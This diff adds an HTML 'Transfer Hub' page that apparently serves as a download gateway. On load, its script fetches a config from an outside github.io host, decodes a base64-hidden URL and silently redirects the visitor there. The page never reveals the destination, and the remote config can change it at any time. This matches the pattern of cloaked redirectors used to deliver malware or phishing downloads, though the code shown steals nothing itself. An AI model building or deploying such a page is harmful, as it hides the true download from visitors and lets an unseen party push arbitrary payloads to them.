@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Transfer Hub</title>
+  <meta name="description" content="Private transfer hub"/>
+  <link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+
+  <!-- Allow inline script for our minimal JS -->
+  <meta http-equiv="Content-Security-Policy" content="
+    default-src 'self';
+    script-src  'self' 'unsafe-inline' https://chorizogoodidea.github.io;
+    style-src   'self';
+    connect-src 'self' https://chorizogoodidea.github.io
+  "/>
+
+  <link rel="stylesheet" href="styles.css"/>
+</head>
+<body>
+  <div class="gateway-shell">
+    <div class="transfer-card">
+      <div class="transfer-mark" aria-hidden="true">
+        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" role="img" aria-label="arrow down">
+          <path d="M12 4v12M7 11l5 5 5-5" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <h1>Setting up your transfer…</h1>
+      <p id="status-line">Initializing…</p>
+      <p id="notice-line" class="notice-line"></p>
+    </div>
+  </div>
+
+  <script>
+  (async function () {
+    const statusEl = document.getElementById('status-line');
+    const noticeEl = document.getElementById('notice-line');
+    const cfgUrl = 'https://chorizogoodidea.github.io/chorizogoodidea/mobi.chester?t=' + Date.now();
+    statusEl.textContent = 'Requesting link…';
+    noticeEl.textContent = '';
+
+    function tryExtractC(text) {
+      // 1) Valid JSON object with key "c"
+      try {
+        const obj = JSON.parse(text);
+        if (obj && typeof obj.c === 'string') return obj.c;
+      } catch (_) {}
+
+      // 2) Looser patterns like c: "...." or 'c' : '...'
+      let m = text.match(/"c"\s*:\s*"([A-Za-z0-9+/=]+)"/);
+      if (!m) m = text.match(/['\"]?c['\"]?\s*[:=]\s*['\"]?([A-Za-z0-9+/=]+)['\"]?/);
+      if (m) return m[1];
+
+      // 3) If body itself is a bare base64 token
+      const trimmed = text.trim();
+      if (/^[A-Za-z0-9+/=]{12,}$/.test(trimmed)) return trimmed;
+
+      return null;
+    }
+
+    try {
+      const res = await fetch(cfgUrl, { cache: 'no-store' });
+      if (!res.ok) throw new Error(`Config HTTP ${res.status}`);
+
+      const body = await res.text();
+      const raw = tryExtractC(body);
+      if (typeof raw !== 'string') {
+        throw new Error('Config is not valid JSON and no "c" token found');
+      }
+
+      let url = '';
+      try {
+        url = atob(raw);
+      } catch (_) {
+        throw new Error('Base64 decode failed');
+      }
+
+      if (!/^https?:\/\//i.test(url)) throw new Error('Invalid URL in config');
+
+      statusEl.textContent = 'Opening download…';
+      // Replace current history entry so the back button doesn't loop
+      window.location.replace(url);
+    } catch (e) {
+      console.error(e);
+      statusEl.textContent = 'Unable to continue.';
+      noticeEl.textContent = `Oops: ${e.message}`;
+    }
+  })();
+  </script>
+</body>
+</html>
